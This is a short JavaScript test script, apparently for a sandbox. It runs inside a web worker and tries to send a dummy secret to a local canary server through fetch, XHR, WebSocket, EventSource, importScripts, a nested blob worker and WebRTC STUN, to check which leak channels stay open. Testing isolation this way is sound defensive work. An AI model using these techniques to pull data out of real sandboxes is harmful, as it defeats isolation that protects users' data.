// Worker-side leak attempts. In the "strict" model, untrusted app code runs only in a
// worker like this: no DOM (so no link hints or frames) and, in current engines, no WebRTC.
const CANARY = "http://127.0.0.1:8199";
const url = (v) => `${CANARY}/leak/${v}?d=s3cr3t`;
const run = (fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch (_) {} };
const hasRTC = typeof RTCPeerConnection !== "undefined";
run(() => fetch(url("worker-fetch"), { mode: "no-cors" }));
run(() => { const x = new XMLHttpRequest(); x.open("GET", url("worker-xhr")); x.send(); });
run(() => new WebSocket(`ws://127.0.0.1:8199/leak/worker-websocket`));
run(() => new EventSource(url("worker-eventsource")));
run(() => importScripts(url("worker-importscripts")));
run(() => new Worker(URL.createObjectURL(new Blob([`fetch("${url("worker-nested")}",{mode:"no-cors"}).catch(()=>{})`]))));
run(async () => {
  if (!hasRTC) return;
  const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:3480" }] });
  pc.createDataChannel("x");
  await pc.setLocalDescription(await pc.createOffer());
});
postMessage({ hasRTC });
